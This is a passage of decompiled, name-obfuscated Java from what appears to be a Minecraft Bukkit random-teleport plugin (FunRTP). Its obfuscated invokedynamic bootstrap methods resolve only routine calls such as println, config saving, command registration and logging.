         return αΓΛβσΟκΠΙθΙΠΖΞΟμΩηΔΚβΛΑΨΠυΕΩνΡυΤλΣΞδφ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΤλξΔΚΘΡεΓΧΟφΗζΑΙμνψΙΝθσΧΜτθΦΤΖεγΟυΞυφΑΡΕοο(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.io.PrintStream", "println", "(Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ΓΕψτΙψΧεξΩαχΓΘοθΘΦΨλκνΗΜΒΣκχΣΚτοΤΠξ = new MutableCallSite(var3.type()))).setTarget(var3);
         return ΓΕψτΙψΧεξΩαχΓΘοθΘΦΨλκνΗΜΒΣκχΣΚτοΤΠξ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ηΔξοππεΤδαΓΠαΤΥΚζΝΜιΒΞΙβχαδλΦοροΔωχσ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.lang.Throwable", "getMessage", "()Ljava/lang/String;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (ιΗφχτδΕΡκΚθεΣδαΘμΔγρΔΓΟΓγνΕψαληΙωΜΕΑωΝπκβΝ = new MutableCallSite(var3.type())).setTarget(var3);
         return ιΗφχτδΕΡκΚθεΣδαΘμΔγρΔΓΟΓγνΕψαληΙωΜΕΑωΝπκβΝ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite λδΛμΤΚνΣρνηΗΤΕΡΗψδΖΝιωΤεΠΗΨΗβΞεβΘΖχλ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.io.PrintStream", "println", "(Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (νΡΒτεΑΣκΙχΥκΧΕΡΙηΔωαΝδσΞΜΔΧΠσρξΞ = new MutableCallSite(var3.type())).setTarget(var3);
         return νΡΒτεΑΣκΙχΥκΧΕΡΙηΔωαΝδσΞΜΔΧΠσρξΞ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite βΔΖτπΣξΖΛτΛΡεΟΖΙψΥΥΒτΧΑΧΕΛΗεθΡνξυΗτθφνιΨπαΧζ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.io.PrintStream", "println", "(Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (τμΠοΣΚΕΩψψβψωαψΟβΕεΑΞεΛΕΗλΙΔκβεΡσλπΞΠΕ = new MutableCallSite(var3.type())).setTarget(var3);
         return τμΠοΣΚΕΩψψβψωαψΟβΕεΑΞεΛΕΗλΙΔκβεΡσλπΞΠΕ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite λΔΩσκφΤοΡμΩΣΚΝΡηχΡΕΦξκΞΒοτααιξρομΩΗΔΠ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.io.PrintStream", "println", "(Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ΞΧνΛβΦΨωΦαΤδΒΥΦΡγΞΡΤεΡτΓεΞνΚνΝΧΡωΑΥεΝβΞ = new MutableCallSite(var3.type()))).setTarget(var3);
         return ΞΧνΛβΦΨωΦαΤδΒΥΦΡγΞΡΤεΡτΓεΞνΚνΝΧΡωΑΥεΝβΞ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΩκΨχΦρεΧιβΦζΙωοΙαμΜΨΖΥφθΘωβζΦΑξμΨΕηζωΛδΧΥΗθθΕ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.io.PrintStream", "println", "(Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(βΔπΛωΝΡκΖΣυΞΚζζαβφρρΘμΙζφΑΝΨΗΝηνΠΝΒΩδπΨνψΓΜΙ = new MutableCallSite(var3.type()))).setTarget(var3);
         return βΔπΛωΝΡκΖΣυΞΚζζαβφρρΘμΙζφΑΝΨΗΝηνΠΝΒΩδπΨνψΓΜΙ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΤΔαΨωβΙΨΔΖτωιΚΖΜΞΞΩωΗΔξχΝρΞτΑοντΩΩΣπ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("ru.manus.funrtp.FunRTP", "saveDefaultConfig", "()V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ΛΓδλψΕλΓψΑηηΥΘΛζαιθδΖζωΤΛΝΒξκοΗρξΘγθΓυΗΒ = new MutableCallSite(var3.type()))).setTarget(var3);
         return ΛΓδλψΕλΓψΑηηΥΘΛζαιθδΖζωΤΛΝΒξκοΗρξΘγθΓυΗΒ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΞιζΖΒνΓΟαντΨΛΡκηΤδΤΡΓΔηΝΔΜΚΣβοψΦΧλλΠξ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("ru.manus.funrtp.FunRTP", "getCommand", "(Ljava/lang/String;)Lorg/bukkit/command/PluginCommand;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ΧΧΣΠφΧωφΑξΔφδμφΓψζΖΕΚΡΜΩΨΠδοΡεΛψκΗψΙαθτνΛαΘηω = new MutableCallSite(var3.type()))).setTarget(var3);
         return ΧΧΣΠφΧωφΑξΔφδμφΓψζΖΕΚΡΜΩΨΠδοΡεΛψκΗψΙαθτνΛαΘηω;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ρΑχσηυεΗμπΔΣτζΧΔΒβρξδΛΛΩχΨκηΧΩθρμΨΕΞ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("org.bukkit.command.PluginCommand", "setExecutor", "(Lorg/bukkit/command/CommandExecutor;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (ΨσοΜΨψσδΟυΔαΞαΠΔΣΤηΨλΦΠβΜΒσΟΤκΧΛσ = new MutableCallSite(var3.type())).setTarget(var3);
         return ΨσοΜΨψσδΟυΔαΞαΠΔΣΤηΨλΦΠβΜΒσΟΤκΧΛσ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite αΛηροδφλαΚΙθΓβρθζλζΜΚνχΨΟΥΚΤχΓ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("ru.manus.funrtp.FunRTP", "getCommand", "(Ljava/lang/String;)Lorg/bukkit/command/PluginCommand;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (ΤΟνΔχδΠρΦθΕζσΒΙΥηΠγνΠΔΛρΞχνΜΥωχΗπ = new MutableCallSite(var3.type())).setTarget(var3);
         return ΤΟνΔχδΠρΦθΕζσΒΙΥηΠγνΠΔΛρΞχνΜΥωχΗπ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΜΧζΩνΠηΗΗΙΡΣνκγΛΦΕηηεΗΑΨοδΤγΓΗγμσεΖΜθΕΕΕΥΞ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("org.bukkit.command.PluginCommand", "setExecutor", "(Lorg/bukkit/command/CommandExecutor;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(ψρβηΞΛΚτλΕοΛΩΧμεχΗεΦηωΝζησθηΑΣΓΦΧοΘκΠθΕΒΥ = new MutableCallSite(var3.type()))).setTarget(var3);
         return ψρβηΞΛΚτλΕοΛΩΧμεχΗεΦηωΝζησθηΑΣΓΦΧοΘκΠθΕΒΥ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΠαντηΔπΘκΘζβΚρΖΕΦατΨιΧΘαΘΠΛΡεΘΦΥΡΥΛπΑ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("ru.manus.funrtp.FunRTP", "getCommand", "(Ljava/lang/String;)Lorg/bukkit/command/PluginCommand;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (κΣΝΞΧΗΑΑοΥΔμχΛΡΚΞΖΝΛψπΔλΧγθΧΓΩπιξΧΓΜΞαΗτωτΓ = new MutableCallSite(var3.type())).setTarget(var3);
         return κΣΝΞΧΗΑΑοΥΔμχΛΡΚΞΖΝΛψπΔλΧγθΧΓΩπιξΧΓΜΞαΗτωτΓ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΑφΑηρτγμυσΒκΡΛφΟΓΑΘμζμΡπαΑΓπΠΟΝΤυδΟΡιξθλΕΖζΕΩολ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("org.bukkit.command.PluginCommand", "setTabCompleter", "(Lorg/bukkit/command/TabCompleter;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         ((MutableCallSite)(φοωζΑηΝχΛΗιπβυΨΧΒσΩηιξΒχθΩμιΙΧΩεθγχΟΟ = new MutableCallSite(var3.type()))).setTarget(var3);
         return φοωζΑηΝχΛΗιπβυΨΧΒσΩηιξΒχθΩμιΙΧΩεθγχΟΟ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite αεΔΗυΔνκΙΥΟοΘΝΟΑΜροψΡΤτμμΦΙΩψΟ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("ru.manus.funrtp.FunRTP", "getServer", "()Lorg/bukkit/Server;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (ΥΕωΝκΠΙΥξψΜΒρΡψαΡΞξΑηδχδΥψαΘιΩΧφΚζυΖΦαΤδνΚηζζ = new MutableCallSite(var3.type())).setTarget(var3);
         return ΥΕωΝκΠΙΥξψΜΒρΡψαΡΞξΑηδχδΥψαΘιΩΧφΚζυΖΦαΤδνΚηζζ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite ΞΤθΛφΖΑΖΩΟλδφΝΣγΞΤΚΟΟΛΚΠσοθγΣημΚΥδ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("ru.manus.funrtp.FunRTP", "getLogger", "()Ljava/util/logging/Logger;", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (ΜηλΙτΔΜοΜνηΙΓχσΗΗοβιΞΒΙΘνθλξΜθΙτΞΕη = new MutableCallSite(var3.type())).setTarget(var3);
         return ΜηλΙτΔΜοΜνηΙΓχσΗΗοβιΞΒΙΘνθλξΜθΙτΞΕη;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }

   static CallSite νθΜΦαψΑΗΤΝΠχιτμμΨΡΣΞΜΥΙΞΟωΔψΗΩφθπΗυθΑκ(MethodHandles.Lookup var0, String var1, MethodType var2) {
      try {
         MethodHandle var3 = BbmMMmmbBbbBBBmmmmBBbmmbmMMmbBmBmbbBmb("java.util.logging.Logger", "info", "(Ljava/lang/String;)V", 1 << (var1.charAt(0) == 'v' ? 2 : 1)).asType(var2);
         (ΤρωζΚπΠσΔΘωΧρΤαδΥΨαεΛξοαΧειΗζιΥΕΤνΨαρΘ = new MutableCallSite(var3.type())).setTarget(var3);
         return ΤρωζΚπΠσΔΘωΧρΤαδΥΨαεΛξοαΧειΗζιΥΕΤνΨαρΘ;
      } catch (IllegalAccessException | ClassNotFoundException | NoSuchMethodException var4) {
         throw new RuntimeException();
      }
   }
}
